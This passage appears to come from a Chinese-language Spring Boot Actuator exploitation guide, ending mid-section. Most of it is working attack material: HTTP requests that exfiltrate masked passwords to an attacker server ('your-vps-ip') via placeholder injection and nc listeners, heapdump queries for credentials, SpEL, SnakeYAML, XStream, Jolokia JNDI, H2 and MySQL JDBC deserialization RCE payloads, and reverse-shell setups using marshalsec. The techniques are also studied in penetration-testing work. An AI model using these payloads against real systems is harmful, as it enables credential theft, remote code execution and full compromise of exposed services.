1.x\nPOST /jolokia Content-Type: application/json {\u0026quot;mbean\u0026quot;: \u0026quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\u0026quot;,\u0026quot;operation\u0026quot;: \u0026quot;getProperty\u0026quot;, \u0026quot;type\u0026quot;: \u0026quot;EXEC\u0026quot;, \u0026quot;arguments\u0026quot;: [\u0026quot;security.user.password\u0026quot;]}  spring 2.x\nPOST /actuator/jolokia Content-Type: application/json {\u0026quot;mbean\u0026quot;: \u0026quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\u0026quot;,\u0026quot;operation\u0026quot;: \u0026quot;getProperty\u0026quot;, \u0026quot;type\u0026quot;: \u0026quot;EXEC\u0026quot;, \u0026quot;arguments\u0026quot;: [\u0026quot;security.user.password\u0026quot;]}   调用其他 Mbean   目标具体情况和存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。\n 0x04：获取被星号脱敏的密码的明文 (方法二) 利用条件：  可以 GET 请求目标网站的 /env 可以 POST 请求目标网站的 /env 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖） 目标使用了 spring-cloud-starter-netflix-eureka-client 依赖 目标可以请求攻击者的服务器（请求可出外网）  利用方法： 步骤一： 找到想要获取的属性名 GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。\n步骤二： 使用 nc 监听 HTTP 请求 在自己控制的外网服务器上监听 80 端口：\nnc -lvk 80  步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性 将下面 http://value:${security.user.password}@your-vps-ip 中的 security.user.password 换成自己想要获取的对应的星号 * 遮掩的属性名；\nyour-vps-ip 换成自己外网服务器的真实 ip 地址。\nspring 1.x\nPOST /env Content-Type: application/x-www-form-urlencoded eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip  spring 2.x\nPOST /actuator/env Content-Type: application/json {\u0026quot;name\u0026quot;:\u0026quot;eureka.client.serviceUrl.defaultZone\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;http://value:${security.user.password}@your-vps-ip\u0026quot;}  步骤四： 刷新配置 spring 1.x\nPOST /refresh Content-Type: application/x-www-form-urlencoded  spring 2.x\nPOST /actuator/refresh Content-Type: application/json  步骤五： 解码属性值 正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 Authorization 头内容：\nAuthorization: Basic dmFsdWU6MTIzNDU2  将其中的 dmFsdWU6MTIzNDU2部分使用 base64 解码，即可获得类似明文值 value:123456，其中的 123456 即是目标星号 * 脱敏前的属性值明文。\n0x05：获取被星号脱敏的密码的明文 (方法三) 利用条件：  通过 POST /env 设置属性触发目标对外网指定地址发起任意 http 请求 目标可以请求攻击者的服务器（请求可出外网）  利用方法：  参考 UUUUnotfound 提出的 issue-1，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据\n 步骤一： 找到想要获取的属性名 GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。\n步骤二： 使用 nc 监听 HTTP 请求 在自己控制的外网服务器上监听 80 端口：\nnc -lvk 80  步骤三： 触发对外 http 请求  spring.cloud.bootstrap.location 方法（同时适用于明文数据中有特殊 url 字符的情况）  spring 1.x\nPOST /env Content-Type: application/x-www-form-urlencoded spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password}  spring 2.x\nPOST /actuator/env Content-Type: application/json {\u0026quot;name\u0026quot;:\u0026quot;spring.cloud.bootstrap.location\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;http://your-vps-ip/?=${security.user.password}\u0026quot;}   eureka.client.serviceUrl.defaultZone 方法（不适用于明文数据中有特殊 url 字符的情况）  spring 1.x\nPOST /env Content-Type: application/x-www-form-urlencoded eureka.client.serviceUrl.defaultZone=http://your-vps-ip/${security.user.password}  spring 2.x\nPOST /actuator/env Content-Type: application/json {\u0026quot;name\u0026quot;:\u0026quot;eureka.client.serviceUrl.defaultZone\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;http://your-vps-ip/${security.user.password}\u0026quot;}  步骤四： 刷新配置 spring 1.x\nPOST /refresh Content-Type: application/x-www-form-urlencoded  spring 2.x\nPOST /actuator/refresh Content-Type: application/json  0x06：获取被星号脱敏的密码的明文 (方法四)  访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果\n 利用条件：  可正常 GET 请求目标 /heapdump 或 /actuator/heapdump 接口  利用方法： 步骤一： 找到想要获取的属性名 GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。\n步骤二： 下载 jvm heap 信息  下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G\n GET 请求目标的 /heapdump 或 /actuator/heapdump 接口，下载应用实时的 JVM 堆信息\n步骤三： 使用 MAT 获得 jvm heap 中的密码明文 参考 文章 方法，使用 Eclipse Memory Analyzer 工具的 OQL 语句\nselect * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(\u0026quot;password\u0026quot;)) 或 select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(\u0026quot;password\u0026quot;)) 查找apikey select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(\u0026quot;aliyun\u0026quot;)) 查找短信接口 select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(\u0026quot;sms\u0026quot;))  辅助用 \u0026ldquo;password\u0026rdquo; 等关键词快速过滤分析，获得密码等相关敏感信息的明文。\n获取配置信息：select * from org.springframework.web.context.support.StandardServletEnvironment\n通过字符串匹配查找用户session：select * from java.lang.String s WHERE toString(s) LIKE \u0026ldquo;.SESSION.\u0026rdquo;\n也可通过模糊搜索，寻找密码信息：\n二：远程代码执行  由于 spring boot 相关漏洞可能是多个组件漏洞组合导致的，所以有些漏洞名字起的不太正规，以能区分为准\n 0x01：whitelabel error page SpEL RCE 利用条件：  spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0 至少知道一个触发 springboot 默认错误页面的接口及参数名  利用方法： 步骤一：找到一个正常传参处 比如发现访问 /article?id=xxx ，页面会报状态码为 500 的错误： Whitelabel Error Page，则后续 payload 都将会在参数 id 处尝试。\n步骤二：执行 SpEL 表达式 输入 /article?id=${7*7} ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。\n由字符串格式转换成 0x** java 字节形式，方便执行任意代码：\n# coding: utf-8 result = \u0026quot;\u0026quot; target = 'open -a Calculator' for x in target: result += hex(ord(x)) + \u0026quot;,\u0026quot; print(result.rstrip(','))  执行 open -a Calculator 命令\n${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}  漏洞原理：  spring boot 处理参数值出错，流程进入 org.springframework.util.PropertyPlaceholderHelper 类中 此时 URL 中的参数值会用 parseStringValue 方法进行递归解析 其中 ${} 包围的内容都会被 org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration 类的 resolvePlaceholder 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞  漏洞分析： ​\tSpringBoot SpEL表达式注入漏洞-分析与复现\n漏洞环境： repository/springboot-spel-rce\n正常访问：\nhttp://127.0.0.1:9091/article?id=66  执行 open -a Calculator 命令：\nhttp://127.0.0.1:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}  0x02：spring cloud SnakeYAML RCE 利用条件：  可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖） 目标依赖的 spring-cloud-starter 版本 \u0026lt; 1.3.0.RELEASE 目标可以请求攻击者的 HTTP 服务器（请求可出外网）  利用方法： 步骤一： 托管 yml 和 jar 文件 在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）\n# 使用 python 快速开启 http server python2 -m SimpleHTTPServer 80 python3 -m http.server 80  在网站根目录下放置后缀为 yml 的文件 example.yml，内容如下：\n!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\u0026quot;http://your-vps-ip/example.jar\u0026quot;] ]] ]  在网站根目录下放置后缀为 jar 的文件 example.jar，内容是要执行的代码，代码编写及编译方式参考 yaml-payload。\n步骤二： 设置 spring.cloud.bootstrap.location 属性 spring 1.x\nPOST /env Content-Type: application/x-www-form-urlencoded spring.cloud.bootstrap.location=http://your-vps-ip/example.yml  spring 2.x\nPOST /actuator/env Content-Type: application/json {\u0026quot;name\u0026quot;:\u0026quot;spring.cloud.bootstrap.location\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;http://your-vps-ip/example.yml\u0026quot;}  步骤三： 刷新配置 spring 1.x\nPOST /refresh Content-Type: application/x-www-form-urlencoded  spring 2.x\nPOST /actuator/refresh Content-Type: application/json  漏洞原理：  spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址 refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容 SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作 先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件 然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化 实例化类时执行恶意代码，造成 RCE 漏洞  漏洞分析： ​\tExploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记\n漏洞环境： repository/springcloud-snakeyaml-rce\n正常访问：\nhttp://127.0.0.1:9092/env  0x03：eureka xstream deserialization RCE 利用条件：  可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖） 目标使用的 eureka-client \u0026lt; 1.8.7（通常包含在 spring-cloud-starter-netflix-eureka-client 依赖中） 目标可以请求攻击者的 HTTP 服务器（请求可出外网）  利用方法： 步骤一：架设响应恶意 XStream payload 的网站 提供一个依赖 Flask 并符合要求的 python 脚本示例，作用是利用目标 Linux 机器上自带的 python 来反弹shell。\n使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。\n步骤二：监听反弹 shell 的端口 一般使用 nc 监听端口，等待反弹 shell\nnc -lvp 443  步骤三：设置 eureka.client.serviceUrl.defaultZone 属性 spring 1.x\nPOST /env Content-Type: application/x-www-form-urlencoded eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example  spring 2.x\nPOST /actuator/env Content-Type: application/json {\u0026quot;name\u0026quot;:\u0026quot;eureka.client.serviceUrl.defaultZone\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;http://your-vps-ip/example\u0026quot;}  步骤四：刷新配置 spring 1.x\nPOST /refresh Content-Type: application/x-www-form-urlencoded  spring 2.x\nPOST /actuator/refresh Content-Type: application/json  漏洞原理：  eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址 refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload 目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞  漏洞分析： ​\tSpring Boot Actuator从未授权访问到getshell\n漏洞环境： repository/springboot-eureka-xstream-rce\n正常访问：\nhttp://127.0.0.1:9093/env  0x04：jolokia logback JNDI RCE 利用条件：   目标网站存在 /jolokia 或 /actuator/jolokia 接口\n  目标使用了 jolokia-core 依赖（版本要求暂未知）并且环境中存在相关 MBean\n  目标可以请求攻击者的 HTTP 服务器（请求可出外网）\n  普通 JNDI 注入受目标 JDK 版本影响，jdk \u0026lt; 6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过\n  利用方法： 步骤一：查看已存在的 MBeans 访问 /jolokia/list 接口，查看是否存在 ch.qos.logback.classic.jmx.JMXConfigurator 和 reloadByURL 关键词。\n步骤二：托管 xml 文件 在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）\n# 使用 python 快速开启 http server python2 -m SimpleHTTPServer 80 python3 -m http.server 80  在根目录放置以 xml 结尾的 example.xml 文件，内容如下：\n\u0026lt;configuration\u0026gt; \u0026lt;insertFromJNDI env-entry-name=\u0026quot;ldap://your-vps-ip:1389/JNDIObject\u0026quot; as=\u0026quot;appName\u0026quot; /\u0026gt; \u0026lt;/configuration\u0026gt;  步骤三：准备要执行的 Java 代码 编写优化过后的用来反弹 shell 的 Java 示例代码 JNDIObject.java，\n使用兼容低版本 jdk 的方式编译：\njavac -source 1.5 -target 1.5 JNDIObject.java  然后将生成的 JNDIObject.class 文件拷贝到 步骤二 中的网站根目录。\n步骤四：架设恶意 ldap 服务 下载 marshalsec ，使用下面命令架设对应的 ldap 服务：\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389  步骤五：监听反弹 shell 的端口 一般使用 nc 监听端口，等待反弹 shell\nnc -lv 443  步骤六：从外部 URL 地址加载日志配置文件  ⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。\n 替换实际的 your-vps-ip 地址访问 URL 触发漏洞：\n/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml  漏洞原理：  直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 ch.qos.logback.classic.jmx.JMXConfigurator 类的 reloadByURL 方法 目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容 目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞) xml 文件中利用 logback 依赖的 insertFormJNDI 标签，设置了外部 JNDI 服务器地址 目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞  漏洞分析： ​\tspring boot actuator rce via jolokia\n漏洞环境： repository/springboot-jolokia-logback-rce\n正常访问：\nhttp://127.0.0.1:9094/env  0x05：jolokia Realm JNDI RCE 利用条件：  目标网站存在 /jolokia 或 /actuator/jolokia 接口 目标使用了 jolokia-core 依赖（版本要求暂未知）并且环境中存在相关 MBean 目标可以请求攻击者的服务器（请求可出外网） 普通 JNDI 注入受目标 JDK 版本影响，jdk \u0026lt; 6u141/7u131/8u121(RMI)，但相关环境可绕过  利用方法： 步骤一：查看已存在的 MBeans 访问 /jolokia/list 接口，查看是否存在 type=MBeanFactory 和 createJNDIRealm 关键词。\n步骤二：准备要执行的 Java 代码 编写优化过后的用来反弹 shell 的 Java 示例代码 JNDIObject.java。\n步骤三：托管 class 文件 在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）\n# 使用 python 快速开启 http server python2 -m SimpleHTTPServer 80 python3 -m http.server 80  将步骤二中编译好的 class 文件拷贝到 HTTP 服务器根目录。\n步骤四：架设恶意 rmi 服务 下载 marshalsec ，使用下面命令架设对应的 rmi 服务：\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389  步骤五：监听反弹 shell 的端口 一般使用 nc 监听端口，等待反弹 shell\nnc -lvp 443  步骤六：发送恶意 payload 根据实际情况修改 springboot-realm-jndi-rce.py 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。\n漏洞原理：  利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm 设置 connectionURL 地址为 RMI Service URL 设置 contextFactory 为 RegistryContextFactory 停止 Realm 启动 Realm 以触发指定 RMI 地址的 JNDI 注入，造成 RCE 漏洞  漏洞分析： ​\tYet Another Way to Exploit Spring Boot Actuators via Jolokia\n漏洞环境： repository/springboot-jolokia-logback-rce\n正常访问：\nhttp://127.0.0.1:9094/env  0x06：restart h2 database query RCE 利用条件：  可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /restart 接口重启应用 存在 com.h2database.h2 依赖（版本要求暂未知）  利用方法： 步骤一：设置 spring.datasource.hikari.connection-test-query 属性  ⚠️ 下面payload 中的 \u0026lsquo;T5\u0026rsquo; 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发\n spring 1.x（无回显执行命令）\nPOST /env Content-Type: application/x-www-form-urlencoded spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');  spring 2.x（无回显执行命令）\nPOST /actuator/env Content-Type: application/json {\u0026quot;name\u0026quot;:\u0026quot;spring.datasource.hikari.connection-test-query\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');\u0026quot;}  步骤二：重启应用 spring 1.x\nPOST /restart Content-Type: application/x-www-form-urlencoded  spring 2.x\nPOST /actuator/restart Content-Type: application/json  漏洞原理：  spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 CREATE ALIAS 创建自定义函数的 SQL 语句 其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句 restart 重启应用，会建立新的数据库连接 如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞  漏洞分析： ​\tremote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database\n漏洞环境： repository/springboot-h2-database-rce\n正常访问：\nhttp://127.0.0.1:9096/actuator/env  0x07：h2 database console JNDI RCE 利用条件：  存在 com.h2database.h2 依赖（版本要求暂未知） spring 配置中启用 h2 console spring.h2.console.enabled=true 目标可以请求攻击者的服务器（请求可出外网） JNDI 注入受目标 JDK 版本影响，jdk \u0026lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）  利用方法： 步骤一：访问路由获得 jsessionid 直接访问目标开启 h2 console 的默认路由 /h2-console，目标会跳转到页面 /h2-console/login.jsp?jsessionid=xxxxxx，记录下实际的 jsessionid=xxxxxx 值。\n步骤二：准备要执行的 Java 代码 编写优化过后的用来反弹 shell 的 Java 示例代码 JNDIObject.java，\n使用兼容低版本 jdk 的方式编译：\njavac -source 1.5 -target 1.5 JNDIObject.java  然后将生成的 JNDIObject.class 文件拷贝到 步骤二 中的网站根目录。\n步骤三：托管 class 文件 在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）\n# 使用 python 快速开启 http server python2 -m SimpleHTTPServer 80 python3 -m http.server 80  将步骤二中编译好的 class 文件拷贝到 HTTP 服务器根目录。\n步骤四：架设恶意 ldap 服务 下载 marshalsec ，使用下面命令架设对应的 ldap 服务：\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389  步骤五：监听反弹 shell 的端口 一般使用 nc 监听端口，等待反弹 shell\nnc -lv 443  步骤六：发包触发 JNDI 注入 根据实际情况，替换下面数据中的 jsessionid=xxxxxx、www.example.com 和 ldap://your-vps-ip:1389/JNDIObject\nPOST /h2-console/login.do?jsessionid=xxxxxx Host: www.example.com Content-Type: application/x-www-form-urlencoded Referer: http://www.example.com/h2-console/login.jsp?jsessionid=xxxxxx language=en\u0026amp;setting=Generic+H2+%28Embedded%29\u0026amp;name=Generic+H2+%28Embedded%29\u0026amp;driver=javax.naming.InitialContext\u0026amp;url=ldap://your-vps-ip:1389/JNDIObject\u0026amp;user=\u0026amp;password=  漏洞分析： ​\tSpring Boot + H2数据库JNDI注入\n漏洞环境： repository/springboot-h2-database-rce\n正常访问：\nhttp://127.0.0.1:9096/h2-console  0x08：mysql jdbc deserialization RCE 利用条件：  可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖） 目标环境中存在 mysql-connector-java 依赖 目标可以请求攻击者的服务器（请求可出外网）  利用方法： 步骤一：查看环境依赖 GET 请求 /env 或 /actuator/env，搜索环境变量（classpath）中是否有 mysql-connector-java 关键词，并记录下其版本号（5.x 或 8.x）；\n搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如 commons-collections、Jdk7u21、Jdk8u20 等；\n搜索 spring.datasource.url 关键词，记录下其 value 值，方便后续恢复其正常 jdbc url 值。\n步骤二：架设恶意 rogue mysql server 在自己控制的服务器上运行 springboot-jdbc-deserialization-rce.py 脚本，并使用 ysoserial 自定义要执行的命令：\njava -jar ysoserial.jar CommonsCollections3 calc \u0026gt; payload.ser  在脚本同目录下生成 payload.ser 反序列化 payload 文件，供脚本使用。\n步骤三：设置 spring.datasource.url 属性  ⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！\n mysql-connector-java 5.x 版本设置属性值为：\njdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8\u0026amp;useSSL=false\u0026amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\u0026amp;autoDeserialize=true  mysql-connector-java 8.x 版本设置属性值为：\njdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8\u0026amp;useSSL=false\u0026amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\u0026amp;autoDeserialize=true  spring 1.x\nPOST /env Content-Type: application/x-www-form-urlencoded spring.datasource.url=对应属性值  spring 2.x\nPOST /actuator/env Content-Type: application/json {\u0026quot;name\u0026quot;:\u0026quot;spring.datasource.url\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;对应属性值\u0026quot;}  步骤四：刷新配置 spring 1.x\nPOST /refresh Content-Type: application/x-www-form-urlencoded  spring 2.x\nPOST /actuator/refresh Content-Type: application/json  步骤五：触发数据库查询 尝试访问网站已知的数据库查询的接口，例如： /product/list ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发\n步骤六：恢复正常 jdbc url 反序列化漏洞利用完成后，使用 步骤三 的方法恢复 步骤一 中记录的 spring.datasource.url 的原始 value 值\n漏洞原理：  spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址 refresh 刷新后设置了一个新的 spring.datasource.url 属性值 当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接 然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据 目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞  漏洞分析： ​\tNew-Exploit-Technique-In-Java-Deserialization-Attack\n漏洞环境：  需要配置 application.properties 中的 spring.datasource.url、spring.datasource.username、spring.datasource.password，保证可以正常连上 mysql 数据库，否则程序启动时就会报错退出\n repository/springboot-mysql-jdbc-rce\n正常访问：\nhttp://127.0.0.1:9097/actuator/env  发送完 payload 后触发漏洞：\nhttp://127.0.0.1:9097/product/list  0x09：restart logging.config logback JNDI RCE 利用条件：  可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /restart 接口重启应用 普通 JNDI 注入受目标 JDK 版本影响，jdk \u0026lt; 6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过 ⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出 ⚠️ HTTP 服务器如果返回含有畸形 xml 语法内容的文件，会导致程序异常退出 ⚠️ JNDI 服务返回的 object 需要实现 javax.naming.spi.ObjectFactory 接口，否则会导致程序异常退出  利用方法： 步骤一：托管 xml 文件 在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）\n# 使用 python 快速开启 http server python2 -m SimpleHTTPServer 80 python3 -m http.server 80  在根目录放置以 xml 结尾的 example.xml 文件，实际内容要根据步骤二中使用的 JNDI 服务来确定：\n\u0026lt;configuration\u0026gt; \u0026lt;insertFromJNDI env-entry-name=\u0026quot;ldap://your-vps-ip:1389/TomcatBypass/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9y\u0026quot; as=\u0026quot;appName\u0026quot; /\u0026gt; \u0026lt;/configuration\u0026gt;  步骤二：托管恶意 ldap 服务及代码 参考文章，修改 JNDIExploit 并启动（也可以使用其他方法）：\njava -jar JNDIExploit-1.0-SNAPSHOT.jar -i your-vps-ip  步骤三：设置 logging.config 属性 spring 1.x\nPOST /env Content-Type: application/x-www-form-urlencoded logging.config=http://your-vps-ip/example.xml  spring 2.x\nPOST /actuator/env Content-Type: application/json {\u0026quot;name\u0026quot;:\u0026quot;logging.config\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;http://your-vps-ip/example.xml\u0026quot;}  步骤四：重启应用 spring 1.x\nPOST /restart Content-Type: application/x-www-form-urlencoded  spring 2.x\nPOST /actuator/restart Content-Type: application/json  漏洞原理：  目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址 restart 重启应用后，程序会请求 URL 地址获得恶意 xml 文件内容 目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞) xml 文件中利用 logback 依赖的 insertFormJNDI 标签，设置了外部 JNDI 服务器地址 目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞  漏洞分析： ​\tspring boot actuator rce via jolokia\n​\thttps://landgrey.me/blog/21/\n漏洞环境： repository/springboot-restart-rce\n正常访问：\nhttp://127.0.0.1:9098/actuator/env  0x0A：restart logging.config groovy RCE 利用条件：  可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /restart 接口重启应用 ⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出 ⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出 ⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出  利用方法： 步骤一：托管 groovy 文件 在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）\n# 使用 python 快速开启 http server python2 -m SimpleHTTPServer 80 python3 -m http.server 80  在根目录放置以 groovy 结尾的 example.groovy 文件，内容为需要执行的 groovy 代码，比如：\nRuntime.getRuntime().exec(\u0026quot;open -a Calculator\u0026quot;)  步骤二：设置 logging.config 属性 spring 1.x\nPOST /env Content-Type: application/x-www-form-urlencoded logging.config=http://your-vps-ip/example.groovy  spring 2.x\nPOST /actuator/env Content-Type: application/json {\u0026quot;name\u0026quot;:\u0026quot;logging.config\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;http://your-vps-ip/example.groovy\u0026quot;}  步骤三：重启应用 spring 1.x\nPOST /restart Content-Type: application/x-www-form-urlencoded  spring 2.x\nPOST /actuator/restart Content-Type: application/json  漏洞原理：  目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址 restart 重启应用后，程序会请求设置的 URL 地址 logback-classic 组件的 ch.qos.logback.classic.util.ContextInitializer.java 代码文件逻辑中会判断 url 是否以 groovy 结尾 如果 url 以 groovy 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞  漏洞环境： repository/springboot-restart-rce\n正常访问：\nhttp://127.0.0.1:9098/actuator/env  0x0B：restart spring.main.sources groovy RCE 利用条件：  可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /restart 接口重启应用 ⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出 ⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出 ⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出  利用方法： 步骤一：托管 groovy 文件 在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）\n# 使用 python 快速开启 http server python2 -m SimpleHTTPServer 80 python3 -m http.server 80  在根目录放置以 groovy 结尾的 example.groovy 文件，内容为需要执行的 groovy 代码，比如：\nRuntime.getRuntime().exec(\u0026quot;open -a Calculator\u0026quot;)  步骤二：设置 spring.main.sources 属性 spring 1.x\nPOST /env Content-Type: application/x-www-form-urlencoded spring.main.sources=http://your-vps-ip/example.groovy  spring 2.x\nPOST /actuator/env Content-Type: application/json {\u0026quot;name\u0026quot;:\u0026quot;spring.main.sources\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;http://your-vps-ip/example.groovy\u0026quot;}  步骤三：重启应用 spring 1.x\nPOST /restart Content-Type: application/x-www-form-urlencoded  spring 2.x\nPOST /actuator/restart Content-Type: application/json  漏洞原理：  目标机器可以通过 spring.main.sources 属性来设置创建 ApplicationContext 的额外源的 URL 地址 restart 重启应用后，程序会请求设置的 URL 地址 spring-boot 组件中的 org.springframework.boot.BeanDefinitionLoader.java 文件代码逻辑中会判断 url 是否以 .groovy 结尾 如果 url 以 .groovy 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞  漏洞环境： repository/springboot-restart-rce\n正常访问：\nhttp://127.0.0.1:9098/actuator/env  0x0C：restart spring.datasource.data h2 database RCE 利用条件：  可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /restart 接口重启应用 环境中需要存在 